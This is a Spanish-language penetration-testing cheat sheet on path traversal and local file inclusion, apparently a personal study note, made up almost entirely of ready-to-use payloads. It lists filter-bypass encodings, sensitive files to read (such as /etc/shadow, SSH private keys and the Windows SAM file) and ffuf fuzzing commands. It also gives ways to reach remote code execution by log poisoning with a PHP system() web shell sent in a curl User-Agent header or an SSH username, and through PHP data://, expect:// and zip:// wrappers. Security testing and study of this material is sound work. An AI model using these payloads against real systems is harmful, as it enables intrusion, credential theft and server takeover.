---
tags: [web, path-traversal, lfi]
status: done
---

# Path Traversal / LFI

---

## Detección

```
# Parámetros típicos
file=, path=, page=, include=, dir=, template=, load=, read=, document=

# Payload básico
../../../etc/passwd
..\..\..\..\windows\win.ini   (Windows)
```

---

## Bypass de Filtros

```bash
# Filtran "../" → encodings
%2e%2e%2f          # URL encode
%2e%2e/            # Parcial
..%2f              # Parcial
%2e%2e%5c          # Windows: ..\
..%5c              # Windows parcial
%252e%252e%252f    # Doble encoding

# Filtran "../" pero no "....///"
....//....//....//etc/passwd   # Se colapsa a ../../..

# Filtran prefix → null byte (PHP < 5.4 + magic_quotes off)
/var/www/images/../../../etc/passwd%00.jpg

# Si la app añade extensión al final
?file=../../../../etc/passwd%00   # null byte trunca extensión
?file=../../../../etc/passwd/.    # punto al final
```

---

## Archivos Objetivo (Linux)

```bash
/etc/passwd               # usuarios del sistema
/etc/shadow               # hashes (requiere root)
/etc/hosts                # red interna
/proc/self/environ        # variables de entorno (puede tener secrets)
/proc/self/cmdline        # comando del proceso actual
/proc/self/fd/[N]         # file descriptors abiertos
/var/log/apache2/access.log   # logs de acceso
/var/log/nginx/access.log
/home/user/.ssh/id_rsa    # clave SSH privada
/home/user/.bash_history  # historial de comandos
/var/www/html/config.php  # configuración web
/proc/net/tcp             # conexiones TCP (IPs internas)
```

---

## Archivos Objetivo (Windows)

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Windows\repair\SAM
C:\Users\Administrator\.ssh\id_rsa
C:\xampp\htdocs\config.php
```

---

## LFI → RCE: Log Poisoning

```bash
# 1. Inyectar PHP en el log de acceso de Apache (via User-Agent)
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" https://target.com/

# 2. Incluir el log
?file=../../../../var/log/apache2/access.log&cmd=id

# Mismo con SSH auth log (si hay acceso)
ssh '<?php system($_GET["cmd"]); ?>'@target.com
?file=../../../../var/log/auth.log&cmd=id
```

---

## LFI → RCE: /proc/self/environ

```bash
# Inyectar en User-Agent o Referer
curl -H "User-Agent: <?php system('id'); ?>" https://target.com/

# Incluir
?file=../../../../proc/self/environ
```

---

## LFI → RCE: PHP Wrappers

```php
# Leer archivo en base64 (bypass de filtros de output)
?file=php://filter/convert.base64-encode/resource=index.php

# Ejecutar PHP desde data:// (si allow_url_include=On)
?file=data://text/plain,<?php system('id');?>

# Usar expect:// (si módulo activo)
?file=expect://id

# zip:// (si se puede subir un zip)
?file=zip:///tmp/shell.zip#shell.php
```

---

## Herramientas

```bash
# LFISuite
python3 lfisuite.py

# ffuf para fuzzear path traversal
ffuf -u "https://target.com/page?file=FUZZ" \
     -w lfi_wordlist.txt \
     -mr "root:x:" \
     -mc all

# Burp Suite — Intruder con lista de payloads LFI
```

